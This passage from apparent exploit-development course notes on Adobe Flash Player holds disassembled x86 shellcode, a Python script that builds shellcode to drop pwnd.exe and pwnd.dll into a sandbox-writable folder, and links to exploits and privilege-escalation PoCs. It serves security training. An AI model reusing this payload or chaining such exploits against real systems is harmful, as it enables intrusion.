17c: 89 45 24                mov    DWORD PTR [ebp+0x24],eax
17f: 6a 00                   push   0x0
181: 68 08 04 00 1a          push   0x1a000408
186: 68 00 26 00 00          push   0x2600      // number of bytes to write (needs to change)
18b: 68 00 00 20 1a          push   0x1a200000  // lpBuffer to *.dll
190: 50                      push   eax
191: ff 55 18                call   DWORD PTR [ebp+0x18]
194: ff 75 24                push   DWORD PTR [ebp+0x24]
197: ff 55 1c                call   DWORD PTR [ebp+0x1c]
19a: ff 75 28                push   DWORD PTR [ebp+0x28]
19d: ff 55 10                call   DWORD PTR [ebp+0x10]
```

Below is a script I wrote in python which generates the shellcode to write pwnd.exe and pwnd.dll to a writeable location which is accessible from the Adobe Flash Sandbox at `C:\ProgramData\microsoft\DeviceSync\`:

```
original = "{ 0x89, 0xE5, 0x81, 0xEC, 0x00, 0x02, 0x00, 0x00, 0x31, 0xC9, 0x64, 0x8B, 0x71, 0x30, 0x8B, 0x76, 0x0C, 0x8B, 0x76, 0x1C, 0x8B, 0x5E, 0x08, 0x8B, 0x7E, 0x20, 0x8B, 0x36, 0x66, 0x39, 0x4F, 0x18, 0x75, 0xF2, 0xEB, 0x55, 0x5E, 0x83, 0xEE, 0x54, 0xEB, 0x54, 0x60, 0x8B, 0x43, 0x3C, 0x8B, 0x7C, 0x03, 0x78, 0x01, 0xDF, 0x8B, 0x4F, 0x18, 0x8B, 0x47, 0x20, 0x01, 0xD8, 0x89, 0x45, 0xFC, 0xE3, 0x36, 0x49, 0x8B, 0x45, 0xFC, 0x8B, 0x34, 0x88, 0x01, 0xDE, 0x31, 0xC0, 0x99, 0xFC, 0xAC, 0x84, 0xC0, 0x74, 0x07, 0xC1, 0xCA, 0x0D, 0x01, 0xC2, 0xEB, 0xF4, 0x3B, 0x54, 0x24, 0x24, 0x75, 0xDF, 0x8B, 0x57, 0x24, 0x01, 0xDA, 0x66, 0x8B, 0x0C, 0x4A, 0x8B, 0x57, 0x1C, 0x01, 0xDA, 0x8B, 0x04, 0x8A, 0x01, 0xD8, 0x89, 0x44, 0x24, 0x1C, 0x61, 0xC3, 0xE8, 0xA6, 0xFF, 0xFF, 0xFF, 0x68, 0x8E, 0x4E, 0x0E, 0xEC, 0xFF, 0xD6, 0x89, 0x45, 0x10, 0x68, 0xA5, 0x17, 0x00, 0x7C, 0xFF, 0xD6, 0x89, 0x45, 0x14, 0x68, 0x1F, 0x79, 0x0A, 0xE8, 0xFF, 0xD6, 0x89, 0x45, 0x18, 0x68, 0xFB, 0x97, 0xFD, 0x0F, 0xFF, 0xD6, 0x89, 0x45, 0x1C, 0x6A, 0x00, 0x68, 0x2E, 0x65, 0x78, 0x65, 0x68, 0x70, 0x77, 0x6E, 0x64, 0x68, 0x79, 0x6E, 0x63, 0x5C, 0x68, 0x69, 0x63, 0x65, 0x53, 0x68, 0x5C, 0x44, 0x65, 0x76, 0x68, 0x73, 0x6F, 0x66, 0x74, 0x68, 0x69, 0x63, 0x72, 0x6F, 0x68, 0x74, 0x61, 0x5C, 0x4D, 0x68, 0x61, 0x6D, 0x44, 0x61, 0x68, 0x72, 0x6F, 0x67, 0x72, 0x68, 0x43, 0x3A, 0x5C, 0x50, 0x54, 0x59, 0x6A, 0x01, 0x6A, 0x00, 0x6A, 0x0C, 0x54, 0x58, 0x6A, 0x00, 0x68, 0x80, 0x00, 0x00, 0x00, 0x6A, 0x02, 0x50, 0x6A, 0x03, 0x68, 0x00, 0x00, 0x00, 0x40, 0x51, 0xFF, 0x55, 0x14, 0x89, 0x45, 0x24, 0x6A, 0x00, 0x68, 0x08, 0x04, 0x00, 0x1A, 0x68, 0x4A, 0x20, 0x01, 0x00, 0x68, 0x00, 0x00, 0x10, 0x1A, 0x50, 0xFF, 0x55, 0x18, 0xFF, 0x75, 0x24, 0xFF, 0x55, 0x1C, 0x6A, 0x00, 0x68, 0x2E, 0x64, 0x6C, 0x6C, 0x68, 0x6E, 0x74, 0x65, 0x63, 0x68, 0x73, 0x79, 0x6D, 0x61, 0x68, 0x79, 0x6E, 0x63, 0x5C, 0x68, 0x69, 0x63, 0x65, 0x53, 0x68, 0x5C, 0x44, 0x65, 0x76, 0x68, 0x73, 0x6F, 0x66, 0x74, 0x68, 0x69, 0x63, 0x72, 0x6F, 0x68, 0x74, 0x61, 0x5C, 0x4D, 0x68, 0x61, 0x6D, 0x44, 0x61, 0x68, 0x72, 0x6F, 0x67, 0x72, 0x68, 0x43, 0x3A, 0x5C, 0x50, 0x54, 0x59, 0x89, 0x4D, 0x28, 0x6A, 0x01, 0x6A, 0x00, 0x6A, 0x0C, 0x54, 0x58, 0x6A, 0x00, 0x68, 0x80, 0x00, 0x00, 0x00, 0x6A, 0x02, 0x50, 0x6A, 0x03, 0x68, 0x00, 0x00, 0x00, 0x40, 0x51, 0xFF, 0x55, 0x14, 0x89, 0x45, 0x24, 0x6A, 0x00, 0x68, 0x08, 0x04, 0x00, 0x1A, 0x68, 0x00, 0x26, 0x00, 0x00, 0x68, 0x00, 0x00, 0x20, 0x1A, 0x50, 0xFF, 0x55, 0x18, 0xFF, 0x75, 0x24, 0xFF, 0x55, 0x1C, 0xFF, 0x75, 0x28, 0xFF, 0x55, 0x10 }"

code_final = "{ 0x89, 0xE5, 0x81, 0xEC, 0x00, 0x02, 0x00, 0x00, 0x31, 0xC9, 0x64, 0x8B, 0x71, 0x30, 0x8B, 0x76, 0x0C, 0x8B, 0x76, 0x1C, 0x8B, 0x5E, 0x08, 0x8B, 0x7E, 0x20, 0x8B, 0x36, 0x66, 0x39, 0x4F, 0x18, 0x75, 0xF2, 0xEB, 0x55, 0x5E, 0x83, 0xEE, 0x54, 0xEB, 0x54, 0x60, 0x8B, 0x43, 0x3C, 0x8B, 0x7C, 0x03, 0x78, 0x01, 0xDF, 0x8B, 0x4F, 0x18, 0x8B, 0x47, 0x20, 0x01, 0xD8, 0x89, 0x45, 0xFC, 0xE3, 0x36, 0x49, 0x8B, 0x45, 0xFC, 0x8B, 0x34, 0x88, 0x01, 0xDE, 0x31, 0xC0, 0x99, 0xFC, 0xAC, 0x84, 0xC0, 0x74, 0x07, 0xC1, 0xCA, 0x0D, 0x01, 0xC2, 0xEB, 0xF4, 0x3B, 0x54, 0x24, 0x24, 0x75, 0xDF, 0x8B, 0x57, 0x24, 0x01, 0xDA, 0x66, 0x8B, 0x0C, 0x4A, 0x8B, 0x57, 0x1C, 0x01, 0xDA, 0x8B, 0x04, 0x8A, 0x01, 0xD8, 0x89, 0x44, 0x24, 0x1C, 0x61, 0xC3, 0xE8, 0xA6, 0xFF, 0xFF, 0xFF, 0x68, 0x8E, 0x4E, 0x0E, 0xEC, 0xFF, 0xD6, 0x89, 0x45, 0x10, 0x68, 0xA5, 0x17, 0x00, 0x7C, 0xFF, 0xD6, 0x89, 0x45, 0x14, 0x68, 0x1F, 0x79, 0x0A, 0xE8, 0xFF, 0xD6, 0x89, 0x45, 0x18, 0x68, 0xFB, 0x97, 0xFD, 0x0F, 0xFF, 0xD6, 0x89, 0x45, 0x1C, 0x6A, 0x00, 0x68, 0x2E, 0x65, 0x78, 0x65, 0x68, 0x70, 0x77, 0x6E, 0x64, 0x68, 0x79, 0x6E, 0x63, 0x5C, 0x68, 0x69, 0x63, 0x65, 0x53, 0x68, 0x5C, 0x44, 0x65, 0x76, 0x68, 0x73, 0x6F, 0x66, 0x74, 0x68, 0x69, 0x63, 0x72, 0x6F, 0x68, 0x74, 0x61, 0x5C, 0x4D, 0x68, 0x61, 0x6D, 0x44, 0x61, 0x68, 0x72, 0x6F, 0x67, 0x72, 0x68, 0x43, 0x3A, 0x5C, 0x50, 0x54, 0x59, 0x6A, 0x01, 0x6A, 0x00, 0x6A, 0x0C, 0x54, 0x58, 0x6A, 0x00, 0x68, 0x80, 0x00, 0x00, 0x00, 0x6A, 0x02, 0x50, 0x6A, 0x03, 0x68, 0x00, 0x00, 0x00, 0x40, 0x51, 0xFF, 0x55, 0x14, 0x89, 0x45, 0x24, 0x6A, 0x00, 0x68, 0x08, 0x04, 0x00, 0x1A,"

code_final += "0x68, 0x4A, 0x20, 0x01, 0x00, " # Exe Size

code_final += "0x68, 0x00, 0x00, 0x10, 0x1A, 0x50, 0xFF, 0x55, 0x18, 0xFF, 0x75, 0x24, 0xFF, 0x55, 0x1C, 0x6A, 0x00, 0x68, 0x2E, 0x64, 0x6C, 0x6C, 0x68, 0x70, 0x77, 0x6e, 0x64, 0x68, 0x79, 0x6E, 0x63, 0x5C, 0x68, 0x69, 0x63, 0x65, 0x53, 0x68, 0x5C, 0x44, 0x65, 0x76, 0x68, 0x73, 0x6F, 0x66, 0x74, 0x68, 0x69, 0x63, 0x72, 0x6F, 0x68, 0x74, 0x61, 0x5C, 0x4D, 0x68, 0x61, 0x6D, 0x44, 0x61, 0x68, 0x72, 0x6F, 0x67, 0x72, 0x68, 0x43, 0x3A, 0x5C, 0x50, 0x54, 0x59, 0x89, 0x4D, 0x28, 0x6A, 0x01, 0x6A, 0x00, 0x6A, 0x0C, 0x54, 0x58, 0x6A, 0x00, 0x68, 0x80, 0x00, 0x00, 0x00, 0x6A, 0x02, 0x50, 0x6A, 0x03, 0x68, 0x00, 0x00, 0x00, 0x40, 0x51, 0xFF, 0x55, 0x14, 0x89, 0x45, 0x24, 0x6A, 0x00, 0x68, 0x08, 0x04, 0x00, 0x1A,"

code_final += " 0x68, 0x00, 0xb8, 0x01, 0x00, " # DLL Size

code_final += "0x68, 0x00, 0x00, 0x20, 0x1A, 0x50, 0xFF, 0x55, 0x18, 0xFF, 0x75, 0x24, 0xFF, 0x55, 0x1C, 0xFF, 0x75, 0x28, 0xFF, 0x55, 0x10 }"

def byte_to_hex(code):
	code = code.replace(",", "")
	code = code.replace(" ", "")
	code = code.replace("{", "")
	code = code.replace("}", "")
	code = code.replace("0x", "")
	#print(code)
	print(len(code))
	return code

byte_to_hex(original)
print(byte_to_hex(code_final))
```

### LPE

I could not find any LPE for Windows 10 32bit or Windows 7 32bit which is can be triggered from the low-integrity context of the Adobe Flash Player Sandbox. If you know any/have access to the actual LPE exploit used in the old AWE course, please share it T.T

- [LPEs by greyhathacker](https://www.exploit-db.com/search?type=local&e_author=Parvez+Anwar)

- [Win 7 Kernel Exploits by leeqwind](https://github.com/leeqwind/HolicPOC/blob/master/windows/win32k/CVE-2017-0101/x86.cpp)

### Softwares:

- [Windows 10 32bit ISO](https://www.softlay.com/downloads/windows-10-1607?download=links)

- [Firefox download](https://ftp.mozilla.org/pub/firefox/releases/50.0/win32/en-US/)

- [Adobe Flex SDK](https://archive.org/details/flex_sdks)

- [Compiling .as to .swf](https://stackoverflow.com/questions/30690509/compile-actionscript-to-a-swf)

- [Java runtime](https://www.majorgeeks.com/files/details/java_runtime_environment_(jre)_32_bit.html), (need to set [JAVA_HOME](https://www.geeksforgeeks.org/how-to-set-java-path-in-windows-and-linux/))

- [Adobe Flash Player Complete Collection #1](https://archive.org/download/flashplayerarchive/pub/flashplayer/installers/archive/)

- [Adobe Flash Player Complete Collection #2](https://archive.org/details/Adobe_Flash_Player_Complete_Collection)

- [Adobe Flash Player 10.1.102.64](https://archive.org/details/adobe_flash_player_10.1.102.64)

- [Adobe Flash Player Version Checker](https://helpx.adobe.com/flash-player.html/)

- [Adobe Flash Player Uninstaller](https://www.techspot.com/downloads/5418-adobe-flash-player-uninstaller.html)

- [Adobe Flash Player Archives #1](https://dl.bobpony.com/software/flashplayer/archives/)

- [Adobe Flash Player Archives #2](https://mirror.kraski.tv/soft/adobe_flash/archive/)

- [Adobe Flash Player Archives #3](https://notepad.patheticcockroach.com/4029/flash-player-12-for-portable-browsers-32-and-64-bits/comment-page-1/)

### References:

- [Initial PoC](https://bugs.chromium.org/p/project-zero/issues/detail?id=323&can=1&q=Shader)

- [Full Exploit Chain](https://www.exploit-db.com/exploits/50290)

- [Flash Player Debugger](https://www.offsec.com/vulndev/fldbg-a-pykd-script-to-debug-flashplayer/)

- [Nice gist to find related content on OSEE](https://gist.github.com/SkyBulk/7c45552b15b77a985e1e03f6584b679d)

- [Nice article to find related content on OSEE](https://www.cyberpunk.rs/best-cybersecurity-courses)

- [Intro to Integer Overflows #1](https://www.youtube.com/watch?v=m4DFYgtqNY8)

- [Intro to Integer Overflows #2](https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf)

- [Adobe Flash Player Sandbox Escape](https://www.exploit-db.com/search?q=+Flash+Broker-Based+-+Sandbox+Escape)

### Other Flash-related Content:

- [CONFidence 2019: "Playing in the Sandbox: Adobe Flash Exploitation Tales" - Björn Ruytenberg](https://www.youtube.com/watch?v=Mlc7pGy02YU)

- [CVE-2012-1535](https://contagiodump.blogspot.com/2012/10/cve-2012-1535-adobe-flash-player.html)
    
- [CVE-2014-0556](https://global.ahnlab.com/global/upload/download/documents/1506262920801954.pdf)

### Symantec LPE (not sure if it is the one used in the course)

- [CVE-2014-3434](https://www.exploit-db.com/exploits/34272)

- [CVE-2019-12750](https://github.com/v-p-b/cve-2019-12750/tree/master/CVE-2019-12750)

### Exploit on IE

- [Disabling EPM](http://www.quero.at/news.php?id=79#)

- [Adobe Flash Player Advisory](https://www.jpcert.or.jp/english/at/2015/at150017.html)

- [How to remove Flash Player from IE](https://community.adobe.com/t5/flash-player-discussions/remove-adobe-flash-player-as-well-as-all-active-x-internet-browsers-too-not-working/td-p/12017340)

- [KB4577586: Update for the removal of Adobe Flash Player: October 27, 2020](https://support.microsoft.com/en-us/topic/kb4577586-update-for-the-removal-of-adobe-flash-player-october-27-2020-931521b9-075a-ce54-b9af-ff3d5da047d5)

- [KB4577586](https://www.catalog.update.microsoft.com/search.aspx?q=4577586)